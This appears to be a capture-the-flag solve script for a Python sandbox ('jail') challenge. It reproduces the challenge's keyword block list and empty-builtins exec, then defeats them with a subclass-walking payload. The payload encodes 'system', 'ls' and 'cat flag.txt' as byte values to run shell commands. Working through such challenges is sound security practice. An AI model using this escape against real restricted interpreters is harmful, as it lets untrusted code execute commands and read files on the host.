#!/bin/python3.12
import string

# ---------------------------------------------------------------------------------------------------------
num = 0
for n, subclass in enumerate(object.__subclasses__()):
    if (hasattr(subclass, "__init__")):
        if (hasattr(subclass.__init__, "__globals__")):
            has_system = 'system' in subclass.__init__.__globals__
            if has_system:
                num = n
                print(n, subclass.__name__)                              # _wrap_close
                break

code = f"().__class__.__base__.__subclasses__()[{num}].__init__.__globals__[().__str__()[:0].join([i.to_bytes().decode() for i in [115, 121, 115, 116, 101, 109]])](().__str__()[:0].join([i.to_bytes().decode() for i in [108, 115]]))"
# ---------------------------------------------------------------------------------------------------------

# code = input('Your scientific computation: ')
code = ''.join([c for c in code if c in string.printable])

for keyword in ['eval', 'exec', 'import', 'open', 'system', 'os', 'builtins', "+", '"', "'"]:
    if keyword in code:
        print('You are jailed!', keyword)
        break
else:
    exec(code, {'__builtins__': {}})




# ().__class__.__base__.__subclasses__()[137].__init__.__globals__[().__str__()[:0].join([i.to_bytes().decode() for i in [115, 121, 115, 116, 101, 109]])](().__str__()[:0].join([i.to_bytes().decode() for i in [108, 115]]))
# ().__class__.__base__.__subclasses__()[137].__init__.__globals__[().__str__()[:0].join([i.to_bytes().decode() for i in [115, 121, 115, 116, 101, 109]])](().__str__()[:0].join([i.to_bytes().decode() for i in [99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116]]))


